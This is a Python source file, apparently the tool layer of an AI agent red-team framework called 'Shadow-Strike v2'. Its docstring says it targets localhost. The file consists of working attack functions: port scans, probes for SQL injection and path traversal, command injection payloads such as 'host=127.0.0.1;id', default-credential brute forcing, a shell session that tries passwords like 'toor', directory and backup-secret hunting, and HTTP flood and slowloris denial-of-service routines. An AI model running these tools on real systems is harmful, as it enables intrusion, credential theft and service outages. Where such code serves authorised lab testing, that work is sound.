"""Shadow-Strike v2 tool layer: pure async tools the agent calls.

Every tool is read/execute-only over localhost targets. All functions return
plain dicts; the agent is responsible for telemetry.
"""
import asyncio
import json
import time
import urllib.parse

import red_prompt


def _parse_http(resp: bytes):
    text = resp.decode(errors="ignore")
    head = text.split("\r\n\r\n", 1)
    status = 0
    headers = {}
    body = ""
    if head:
        lines = head[0].split("\r\n")
        if lines and " " in lines[0]:
            try:
                status = int(lines[0].split(" ")[1])
            except Exception:
                pass
        for line in lines[1:]:
            if ":" in line:
                k, v = line.split(":", 1)
                headers[k.strip().lower()] = v.strip()
        if len(head) > 1:
            body = head[1]
    return {"status": status, "headers": headers, "body": body[:200]}


async def _connect(host, port, timeout=2):
    r, w = await asyncio.wait_for(asyncio.open_connection(host, port), timeout)
    return r, w


async def tcp_probe(host, port, timeout=2):
    try:
        r, w = await _connect(host, port, timeout)
        w.close()
        return True
    except Exception:
        return False


async def banner_grab(host, port, timeout=2):
    try:
        r, w = await _connect(host, port, timeout)
        data = await asyncio.wait_for(r.read(200), timeout)
        w.close()
        return data.decode(errors="ignore").strip()
    except Exception:
        return None


async def http_get(host, port, path, extra_headers=None, agent_ip=None, timeout=3):
    try:
        r, w = await _connect(host, port, timeout)
        req = f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\nConnection: close\r\n"
        if agent_ip:
            req += f"X-Agent-IP: {agent_ip}\r\n"
        if extra_headers:
            for k, v in extra_headers.items():
                req += f"{k}: {v}\r\n"
        req += "\r\n"
        w.write(req.encode())
        await w.drain()
        data = await asyncio.wait_for(r.read(8192), timeout)
        w.close()
        return _parse_http(data)
    except Exception:
        return {"status": 0, "headers": {}, "body": ""}


async def http_post_json(host, port, path, payload, agent_ip=None, timeout=3):
    try:
        r, w = await _connect(host, port, timeout)
        body = json.dumps(payload)
        req = (f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
               f"Content-Type: application/json\r\n"
               f"Content-Length: {len(body)}\r\nConnection: close\r\n")
        if agent_ip:
            req += f"X-Agent-IP: {agent_ip}\r\n"
        req += "\r\n" + body
        w.write(req.encode())
        await w.drain()
        data = await asyncio.wait_for(r.read(8192), timeout)
        w.close()
        return _parse_http(data)
    except Exception:
        return {"status": 0, "headers": {}, "body": ""}


async def probe_ports(targets, timeout=2):
    """TCP connect scan of configured targets. Returns {name: {port: bool}}."""
    out = {}
    for name, t in targets.items():
        out[name] = {"host": t["host"], "ip": t["ip"], "ports": {}}
        for port in (t["port"], t["port"] + 1, 22, 80):
            out[name]["ports"][port] = await tcp_probe(t["host"], port, timeout)
    return out


async def probe_web(host, port, agent_ip):
    """HTTP fingerprint: version, endpoints, injection/traversal/auth signatures."""
    r = await http_get(host, port, "/", agent_ip=agent_ip)
    version = r["headers"].get("server", "")
    sec = [k for k in r["headers"].keys()]
    eps = {}
    for p in ("/api/health", "/admin", "/api/config", "/static/config.json",
              "/backup", "/.git/config", "/debug", "/api/ping?host=127.0.0.1"):
        res = await http_get(host, port, p, agent_ip=agent_ip)
        eps[p] = res["status"]
    rq = await http_get(host, port, "/api/users?id=1", agent_ip=agent_ip)
    rs = await http_get(host, port, "/api/users?id=1%27", agent_ip=agent_ip)
    rt = await http_get(host, port, "/static/../config.json", agent_ip=agent_ip)
    # encoded traversal bypass probe
    renc = await http_get(host, port, "/static/%2e%2e/config.json", agent_ip=agent_ip)
    # command injection probe
    rc = await http_get(host, port, "/api/ping?host=127.0.0.1;id", agent_ip=agent_ip)
    return {
        "version": version,
        "endpoints": {"/": r["status"], **eps,
                       "/api/users?id=1": rq["status"]},
        "sqli": ({"path": "/api/users", "probe_status": rs["status"],
                  "error": rs["body"][:80]}
                 if rs["status"] == 500 else None),
        "traversal": ({"path": "/static/../config.json", "status": rt["status"]}
                      if rt["status"] == 200 else None),
        "traversal_encoded": ({"path": "/static/%2e%2e/config.json",
                               "status": renc["status"]}
                              if renc["status"] == 200 else None),
        "cmd_inject": ({"path": "/api/ping?host=127.0.0.1;id",
                        "status": rc["status"],
                        "echo": rc["body"][:80]}
                       if rc["status"] == 200 and "uid=" in rc["body"] else None),
        "hidden_dirs": {p: eps.get(p) for p in
                        ("/admin", "/backup", "/.git/config", "/debug")
                        if eps.get(p) and eps.get(p) != 404},
        "backup_exposed": {p: eps.get(p) for p in
                           ("/backup/config.bak", "/.git/config", "/app.old")
                           if eps.get(p) and eps.get(p) != 404},
        "sec_headers": sec,
        "health": rq,
    }


async def probe_auth(host, port, agent_ip, creds):
    """Test default credentials against the login endpoint."""
    out = {"tried": [], "success": None}
    for user, pwd in creds:
        res = await http_post_json(host, port, "/api/auth/login",
                                   {"user": user, "password": pwd},
                                   agent_ip=agent_ip)
        out["tried"].append({"user": user, "status": res["status"]})
        if res["status"] == 200:
            out["success"] = {"user": user, "password": pwd}
            break
        await asyncio.sleep(0.1)
    return out


async def stress(host, port, agent_ip, concurrency, duration):
    """Controlled burst flood with a Semaphore. Never fully saturates the host."""
    sem = asyncio.Semaphore(max(1, concurrency))
    dist = {}
    start = time.time()

    async def hit():
        async with sem:
            res = await http_get(host, port, "/", agent_ip=agent_ip,
                                 timeout=2)
            key = res["status"]
            dist[key] = dist.get(key, 0) + 1

    while time.time() - start < duration:
        tasks = [hit() for _ in range(concurrency)]
        await asyncio.gather(*tasks, return_exceptions=True)
        await asyncio.sleep(0.3)
    total = sum(dist.values()) or 1
    errors = dist.get(0, 0)
    return {
        "distribution": dist,
        "total": total,
        "error_rate": round(errors / total, 3),
        "has_429": 429 in dist,
        "has_503": 503 in dist,
    }


async def tunnel(host, port, agent_ip, commands):
    """Sequential decoy session: authenticate if prompted, then run commands."""
    frames = []
    try:
        r, w = await _connect(host, port)
        banner = await asyncio.wait_for(r.read(200), 2)
        frames.append({"kind": "banner", "data": banner.decode(errors="ignore")[:60]})
        if b"password" in banner.lower():
            for cred in ("shadow", "toor"):
                w.write((cred + "\n").encode())
                await w.drain()
                out = await asyncio.wait_for(r.read(256), 3)
                frames.append({"kind": "auth", "cred": cred,
                               "output": out.decode(errors="ignore")[:80]})
                if b"password" not in out.lower():
                    break
        for cmd in commands:
            w.write((cmd + "\n").encode())
            await w.drain()
            out = await asyncio.wait_for(r.read(1024), 3)
            frames.append({"kind": "cmd", "cmd": cmd,
                           "output": out.decode(errors="ignore")[:100]})
            await asyncio.sleep(0.4)
        w.close()
    except Exception as e:
        frames.append({"kind": "error", "data": str(e)[:80]})
    return frames


async def dir_brute(host, port, agent_ip, paths=None, timeout=2):
    """Wordlist-based directory/file discovery. Returns non-404 hits."""
    paths = paths or red_prompt.DIR_WORDLIST
    found = {}
    for p in paths:
        res = await http_get(host, port, p, agent_ip=agent_ip, timeout=timeout)
        if res["status"] not in (0, 404):
            found[p] = {"status": res["status"], "size": len(res["body"]),
                        "snippet": res["body"][:80]}
    return {"hits": len(found), "found": found}


async def encoded_traversal(host, port, agent_ip, variants=None):
    """Fire every encoded traversal variant. Returns the ones that leak a file."""
    variants = variants or red_prompt.TRAVERSAL_VARIANTS
    results = {}
    for v in variants:
        res = await http_get(host, port, v, agent_ip=agent_ip)
        if res["status"] == 200 and ("content" in res["body"]
                                     or "config" in res["body"]
                                     or "passwd" in res["body"]):
            results[v] = {"status": res["status"], "snippet": res["body"][:80]}
        elif res["status"] == 200:
            results[v] = {"status": res["status"], "snippet": res["body"][:40]}
    return {"tried": len(variants), "leaked": len(results), "results": results}


async def backup_hunt(host, port, agent_ip, paths=None):
    """Hunt exposed backup/config files that should never be public."""
    paths = paths or red_prompt.BACKUP_PATHS
    exposed = {}
    for p in paths:
        res = await http_get(host, port, p, agent_ip=agent_ip)
        if res["status"] == 200 and res["body"]:
            exposed[p] = {"status": res["status"],
                          "content": res["body"][:160],
                          "secret_keys": [k for k in
                                          ("db_pass", "password", "secret",
                                           "api_key", "token", "user")
                                          if k in res["body"].lower()]}
    return {"exposed": len(exposed), "files": exposed}


async def cmd_inject(host, port, agent_ip, payloads=None):
    """Command injection attempts against /api/ping?host=. Returns successes."""
    payloads = payloads or red_prompt.CMD_INJECT_PAYLOADS
    results = []
    for payload in payloads:
        res = await http_get(host, port,
                             "/api/ping?host=" + urllib.parse.quote(payload),
                             agent_ip=agent_ip)
        hit = res["status"] == 200 and any(
            m in res["body"] for m in ("uid=", "root:", "passwd", "Linux"))
        results.append({"payload": payload, "status": res["status"],
                        "echo": res["body"][:90], "hit": hit})
        await asyncio.sleep(0.05)
    return {"tried": len(payloads), "hits": sum(1 for r in results if r["hit"]),
            "results": results}


async def slowloris(host, port, agent_ip, sockets=12, duration=3, timeout=2):
    """Slow-header connection hold. Opens sockets and dribbles partial requests."""
    held = 0
    closed = 0
    conns = []
    for _ in range(sockets):
        try:
            r, w = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout)
            w.write(b"GET / HTTP/1.1\r\nHost: x\r\n")
            await w.drain()
            conns.append(w)
            held += 1
        except Exception:
            closed += 1
    start = time.time()
    i = 0
    while time.time() - start < duration and conns:
        w = conns[i % len(conns)]
        try:
            w.write(f"X-a: {i}\r\n".encode())
            await w.drain()
            i += 1
        except Exception:
            conns.remove(w)
            closed += 1
        await asyncio.sleep(0.4)
    for w in conns:
        try:
            w.close()
        except Exception:
            pass
    return {"opened": held, "held_open": len(conns), "closed": closed,
            "duration": duration}


async def large_payload(host, port, agent_ip, size=200000, timeout=5):
    """Oversized request body - resource exhaustion probe (bounded)."""
    body = "A" * size
    res = await http_post_json(host, port, "/api/auth/login",
                               {"user": body[:200], "password": body[:200]},
                               agent_ip=agent_ip, timeout=timeout)
    return {"size": size, "status": res["status"], "response_time": 0}